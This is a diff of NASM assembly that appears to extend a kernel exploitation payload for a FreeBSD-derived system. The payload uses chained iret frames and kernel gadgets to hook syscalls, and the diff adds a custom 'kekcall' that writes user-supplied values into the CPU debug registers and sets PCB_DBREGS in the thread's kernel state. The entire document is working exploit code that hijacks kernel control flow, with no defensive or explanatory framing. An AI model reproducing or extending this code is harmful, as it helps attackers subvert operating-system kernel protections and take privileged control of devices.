@@ -11,6 +11,10 @@ extern pop_all_except_rdi_iret
 extern add_rsp_iret
 extern dr2gpr_start
 extern dr2gpr_end
+extern gpr2dr_1_start
+extern gpr2dr_1_end
+extern gpr2dr_2_start
+extern gpr2dr_2_end
 extern scratchpad
 extern copyin
 extern copyout
@@ -242,6 +246,21 @@ dq (%2)
 section .text
 %endmacro
 
+; orb ptr1, ptr2
+%macro orb 2
+memcpy %%peek+iret_rsi, (%1), 1
+memcpy %%peek+iret_rsi+1, (%2), 1
+%%peek:
+memcpy (%1), or_table, 1
+%endmacro
+
+; orbi ptr1, imm
+%macro orbi 2
+memcpy %%peek+iret_rsi+1, (%1), 1
+%%peek:
+memcpy (%1), or_table+(%2), 1
+%endmacro
+
 ; save_reg where, what
 %macro save_reg 2
 dq push_pop_all_iret
@@ -342,6 +361,12 @@ dq 0
 %%next_check:
 %endmacro
 
+; if_not_equal cond, arg1, arg2, then
+%macro if_not_equal 4
+%1 (%2), (%3), (%4), %%next_check, (%4)
+%%next_check:
+%endmacro
+
 ; on_rip rip, tgt
 %macro on_rip 2
 ;cmpqibe iret_frame, (%1), %%next_check, (%2), %%next_check
@@ -366,6 +391,14 @@ db 0
 section .text
 %endmacro
 
+; pop_stack start, length
+%macro pop_stack 2
+memcpy %%peek+iret_rsi, iret_frame+24, 8
+%%peek:
+memcpy0 (%1), 0, (%2), doreti_iret
+save_reg iret_frame+24, iret_rsi
+%endmacro
+
 ; pushqi imm
 %macro pushqi 1
 push_stack %%value, 8
@@ -377,17 +410,23 @@ section .text
 
 ; read_dbgregs
 %macro read_dbgregs 0
-memcpy0 read_dbgregs_lr, %%lr, 8, doreti_iret
+pokeq0 read_dbgregs_lr, %%end_macro, doreti_iret
 dq pop_all_iret
 dq 0x20
 dq 2
 dq read_dbgregs_fn
 dq 0
 %%end_macro:
-section .data.qword
-%%lr:
-dq %%end_macro
-section .text
+%endmacro
+
+%macro write_dbgregs 0
+pokeq0 write_dbgregs_lr, %%end_macro, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+dq write_dbgregs_fn
+dq 0
+%%end_macro:
 %endmacro
 
 prog_entry:
@@ -397,7 +436,12 @@ prog_entry:
 ; actual logic starts here
 
 on_rip syscall_before, handle_syscall_before
+on_rip doreti_iret, handle_broken_iret
 on_rip dr2gpr_end, read_dbgregs_ret
+on_rip gpr2dr_1_end, write_dbgregs_ret1
+on_rip gpr2dr_2_end, write_dbgregs_ret2
+
+on_rip 0xde00ad0000000001, handle_kekcall_write_dbregs_after_copyout
 
 ; generic fallback for unknown crashes
 
@@ -426,6 +470,17 @@ dq 2
 dq regs_for_exit
 dq 0
 
+handle_broken_iret:
+; just pretend that we crashed inside the iret
+memcpy .copy+iret_rsi, iret_frame+24, 8
+.copy:
+memcpy0 iret_frame, 0, 40, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+dq prog_entry
+dq 0
+
 handle_syscall_before:
 decrypt_pointer regs_stash+iret_rax
 cmpqibe regs_stash+iret_rax, sysents+48*39, decrypt_end, handle_getppid, decrypt_end
@@ -435,6 +490,7 @@ memcpy_from_offset regs_for_exit, iret_frame+24, syscall_rsp_to_regs_stash, iret
 
 ; handle kekcalls
 if_equal cmpdibe, regs_for_exit+iret_rax+4, 1, handle_kekcall_read_dbregs
+if_equal cmpdibe, regs_for_exit+iret_rax+4, 2, handle_kekcall_write_dbregs
 
 ; call real getppid
 pushqi syscall_after
@@ -446,6 +502,8 @@ dq decrypt_end
 dq 0
 
 handle_kekcall_read_dbregs:
+; set syscall return value to 0
+memcpy_offset regs_stash+iret_rdi, td_retval, zero, 8
 ; rsi = destination, from userspace
 memcpy regs_stash+iret_rsi, regs_for_exit+iret_rdi, 8
 ; rdx = count, fixed
@@ -459,11 +517,71 @@ memcpy dbgreg_copyout_frame_rsp, iret_frame+24, 8
 push_stack dbgreg_copyout_frame_dbgregs, dbgreg_copyout_frame_end-dbgreg_copyout_frame_dbgregs
 ; rdi = source, copy from kernel stack
 memcpy regs_stash+iret_rdi, iret_frame+24, 8
+; set return address
+pokeq dbgreg_copyout_frame_rip, syscall_after
 ; push the rest of the stack frame
 push_stack dbgreg_copyout_frame, dbgreg_copyout_frame_dbgregs-dbgreg_copyout_frame
 ; set rip
-lonely_label:
 pokeq0 iret_frame, copyout, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+dq decrypt_end
+dq 0
+
+handle_kekcall_write_dbregs:
+; set syscall return value to 0
+memcpy_offset regs_stash+iret_rdi, td_retval, zero, 8
+; save the thread pointer into the spare 7th slot
+memcpy dbgreg_copyout_frame_dbgregs+48, regs_stash+iret_rdi, 8
+; rdi = source, from userspace
+memcpy regs_stash+iret_rdi, regs_for_exit+iret_rdi, 8
+; rdx = count, fixed
+pokeq regs_stash+iret_rdx, 48
+; allocate space for debug registers on kernel stack
+push_stack dbgreg_copyout_frame_dbgregs, dbgreg_copyout_frame_end-dbgreg_copyout_frame_dbgregs
+; iret should not pop this data
+memcpy dbgreg_copyout_frame_rsp, iret_frame+24, 8
+; rsi = destination, copy to kernel stack
+memcpy regs_stash+iret_rsi, iret_frame+24, 8
+; set up magic return
+pokeq dbgreg_copyout_frame_rip, 0xde00ad0000000001
+; push the rest of the stack frame
+push_stack dbgreg_copyout_frame, dbgreg_copyout_frame_dbgregs-dbgreg_copyout_frame
+; set rip
+pokeq0 iret_frame, copyin, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+dq decrypt_end
+dq 0
+
+handle_kekcall_write_dbregs_after_copyout:
+; pop the data from stack
+pop_stack dbgreg_copyout_frame_dbgregs, dbgreg_copyout_frame_end-dbgreg_copyout_frame_dbgregs
+; check if copyin has succeeded
+if_not_equal cmpdibe, regs_stash+iret_rax, 0, .copyin_failed
+; write debug registers
+memcpy dbgregs, dbgreg_copyout_frame_dbgregs, 48
+write_dbgregs
+; get td_pcb
+memcpy_from_offset dbgreg_copyout_frame_dbgregs+48, dbgreg_copyout_frame_dbgregs+48, td_pcb, 8
+; get pcb_flags pointer
+ptr_add_imm .peek+iret_rsi, dbgreg_copyout_frame_dbgregs+48, pcb_flags
+memcpy .poke+iret_rdi, .peek+iret_rsi, 8
+; set PCB_DBREGS (2)
+section .data.byte
+.tmp:
+db 0
+section .text
+.peek:
+memcpy .tmp, 0, 1
+orbi .tmp, 2
+.poke:
+memcpy 0, .tmp, 1
+; done, now return
+.copyin_failed:
+pokeq0 iret_frame, syscall_after, doreti_iret
 dq pop_all_iret
 dq 0x20
 dq 2
@@ -526,6 +644,47 @@ read_dbgregs_lr:
 dq 0
 dq 0
 
+write_dbgregs_fn:
+memcpy .run_gadget1+iret_r15, dbgregs, 8
+memcpy .run_gadget1+iret_r14, dbgregs+8, 8
+memcpy .run_gadget1+iret_r13, dbgregs+16, 8
+memcpy .run_gadget1+iret_rbx, dbgregs+24, 8
+memcpy .run_gadget1+iret_r11, dbgregs+32, 8
+memcpy .run_gadget1+iret_rcx, dbgregs+40, 8
+memcpy .run_gadget1+iret_rax, dbgregs+40, 8
+memcpy regs_for_exit, regs_stash, iret_rip
+memcpy regs_for_exit+iret_rip, iret_frame, 40
+.run_gadget1:
+times iret_r8 db 0
+dq 0xdeadbeefdeadbeef
+times (iret_rip-iret_r8-8) db 0
+dq gpr2dr_1_start
+dq 0x20
+dq 2
+dq 0
+dq 0
+write_dbgregs_ret1:
+memcpy .run_gadget2+iret_r11, dbgregs+32, 8
+memcpy .run_gadget2+iret_r15, dbgregs+40, 8
+.run_gadget2:
+times iret_r12 db 0
+dq 0xdeadbeefdeadbeef
+times (iret_rip-iret_r12-8) db 0
+dq gpr2dr_2_start
+dq 0x20
+dq 2
+dq 0
+dq 0
+write_dbgregs_ret2:
+memcpy regs_stash, regs_for_exit, iret_rip
+memcpy0 iret_frame, regs_for_exit+iret_rip, 40, doreti_iret
+dq pop_all_iret
+dq 0x20
+dq 2
+write_dbgregs_lr:
+dq 0
+dq 0
+
 section .data.qword
 
 dbgregs:
@@ -533,11 +692,13 @@ times 6 dq 0
 
 dbgreg_copyout_frame:
 dq doreti_iret
-dq syscall_after
+dbgreg_copyout_frame_rip:
+dq 0
 dq 0x20
 dq 0x202
 dbgreg_copyout_frame_rsp:
 dq 0
+zero:
 dq 0
 dbgreg_copyout_frame_dbgregs:
 times 7 dq 0
@@ -545,11 +706,20 @@ dbgreg_copyout_frame_end:
 
 ; pseudocode:
 ; comparison_table[a][b] = 8 * (intcmp(a, b) + 1)
-section .data.compar
+section .data.align16
 align 65536
 comparison_table:
 %rep 65536
 db ((($-comparison_table)/256 - ($-comparison_table) % 256 + 256) / 256 + (($-comparison_table)/256 - ($-comparison_table) % 256 + 255) / 256) * 8
+%endrep
+
+; pseudocode:
+; or_table[a][b] = a | b
+section .data.align16
+align 65536
+or_table:
+%rep 65536
+db (($-or_table)/256) | (($-or_table) % 256)
 %endrep
 
 section .data.log
